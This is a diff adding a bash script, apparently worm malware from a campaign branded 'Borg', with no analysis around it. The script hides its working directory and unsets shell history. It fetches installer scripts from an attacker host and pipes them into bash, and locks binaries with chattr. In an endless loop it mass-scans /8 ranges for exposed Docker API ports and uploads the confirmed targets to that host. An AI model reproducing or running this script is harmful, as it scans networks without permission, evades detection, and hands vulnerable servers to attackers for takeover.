@@ -1,0 +1,48 @@
+#!/bin/bash
+unset HISTFILE
+export HOME=/root
+export LC_ALL=C
+export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
+BORG_KUBE="http://the.borg.wtf"
+
+if ! [ -d "/var/tmp/.../...BORG.../" ] ; then mkdir -p /var/tmp/.../...BORG.../ ; fi
+
+if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi ; fi
+if ! type bash 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi ; fi
+if ! type gcc 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y gcc 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y gcc 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add gcc 2>/dev/null 1>/dev/null; fi ; fi
+if ! type make 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y make 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y make 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add make 2>/dev/null 1>/dev/null; fi ; fi
+if ! type git 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y git 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y git 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add git 2>/dev/null 1>/dev/null; fi ; fi
+if ! type go 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y golang 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y golang 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add go 2>/dev/null 1>/dev/null; fi ; fi
+if ! type jq 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y jq 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y jq 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add jq 2>/dev/null 1>/dev/null; fi ; fi
+if ! type jq 2>/dev/null 1>/dev/null; then curl -Lk -s http://the.borg.wtf/outgoing/binary_files/system/jq -o /usr/bin/jq ; chmod +x /usr/bin/jq ; chattr +i /usr/bin/jq ; fi
+if ! type masscan 2>/dev/null 1>/dev/null; then curl -Lk -s http://the.borg.wtf/outgoing/script_files/setup/masscan.assi | bash ; fi
+if ! type zgrab 2>/dev/null 1>/dev/null; then curl -Lk -s http://the.borg.wtf/outgoing/script_files/setup/zgrab.assi | bash ; fi
+if ! type zgrab 2>/dev/null 1>/dev/null; then curl -Lk -s http://the.borg.wtf/outgoing/binary_files/scanner/zgrab -o /usr/bin/zgrab ; chmod +x /usr/bin/zgrab ; chattr +i /usr/bin/zgrab ; fi
+
+while true
+do
+GET_RANGE=`curl -s http://the.borg.wtf/processing/range.php?target=docker`
+RANGE=$GET_RANGE".0.0.0/8"
+
+masscan --open -p 2375,2376,4243 $RANGE --rate=5000000 >> /var/tmp/.../...BORG.../d.out.txt
+
+cat /var/tmp/.../...BORG.../d.out.txt | grep '2375/tcp' | awk '{print $6}' | zgrab --senders 200 --port 2375 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/.../...BORG.../d.out_2375.txt
+cat /var/tmp/.../...BORG.../d.out.txt | grep '2376/tcp' | awk '{print $6}' | zgrab --senders 200 --port 2376 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/.../...BORG.../d.out_2376.txt
+cat /var/tmp/.../...BORG.../d.out.txt | grep '4243/tcp' | awk '{print $6}' | zgrab --senders 200 --port 4243 --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> /var/tmp/.../...BORG.../d.out_4243.txt
+
+rm -f /var/tmp/.../...BORG.../d.out.txt
+find /var/tmp/.../...BORG.../ -size 0 -exec rm {} \;
+
+if [ -f "/var/tmp/.../...BORG.../d.out_2375.txt" ] ; then curl -F "userfile=@/var/tmp/.../...BORG.../d.out_2375.txt" "http://the.borg.wtf/incoming/results.php?target=docker" ; rm -f /var/tmp/.../...BORG.../d.out_2375.txt ; fi
+
+if [ -f "/var/tmp/.../...BORG.../d.out_2376.txt" ] ; then curl -F "userfile=@/var/tmp/.../...BORG.../d.out_2376.txt" "http://the.borg.wtf/incoming/results.php?target=docker" ; rm -f /var/tmp/.../...BORG.../d.out_2376.txt ; fi
+
+if [ -f "/var/tmp/.../...BORG.../d.out_4243.txt" ] ; then curl -F "userfile=@/var/tmp/.../...BORG.../d.out_4243.txt" "http://the.borg.wtf/incoming/results.php?target=docker" ; rm -f /var/tmp/.../...BORG.../d.out_4243.txt ; fi
+
+
+
+done 
+
+
+
+
